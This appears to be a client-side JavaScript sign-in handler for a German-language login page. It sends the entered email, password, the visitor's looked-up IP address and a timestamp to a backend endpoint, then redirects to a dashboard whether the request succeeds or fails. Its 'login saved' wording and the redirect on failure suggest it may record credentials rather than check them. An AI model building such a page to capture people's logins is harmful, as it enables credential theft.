document.addEventListener('DOMContentLoaded', () => {
  const signInButton = document.getElementById('signInButton');
  if (signInButton) {
    signInButton.addEventListener('click', signIn);
  } else {
    console.error('Anmelden-Button nicht gefunden.');
  }
});

async function signIn() {
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  const gotcha = document.querySelector('input[name="_gotcha"]').value;

  if (!email || !password) {
    alert('Bitte fülle alle Felder aus.');
    return;
  }

  if (gotcha) {
    console.log('Bot erkannt!');
    setTimeout(() => {
      window.location.href = 'dashboard.html';
    }, 1000);
    return;
  }

  const lastSignIn = localStorage.getItem('lastSignIn');
  if (lastSignIn && Date.now() - parseInt(lastSignIn) < 30000) {
    alert('Bitte warte 30 Sekunden vor der nächsten Anmeldung.');
    return;
  }

  try {
    let ip_address = 'Unknown';
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      ip_address = data.ip;
    } catch (err) {
      console.error('Fehler beim Abrufen der IP-Adresse:', err);
    }

    const payload = {
      email,
      password,
      ip_address,
      timestamp: new Date().toISOString()
    };

    const res = await fetch('/api/signin', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    const data = await res.json();

    if (data.success) {
      console.log('Anmeldung gespeichert.');
      localStorage.setItem('lastSignIn', Date.now().toString());
      window.location.href = 'dashboard.html';
    } else {
      throw new Error(data.error || 'Unbekannter Fehler');
    }

  } catch (err) {
    console.error('Fehler beim Speichern:', err);
    alert('Ein Fehler ist aufgetreten. Bitte versuche es später erneut.');
    setTimeout(() => {
      window.location.href = 'dashboard.html';
    }, 2000);
  }
}
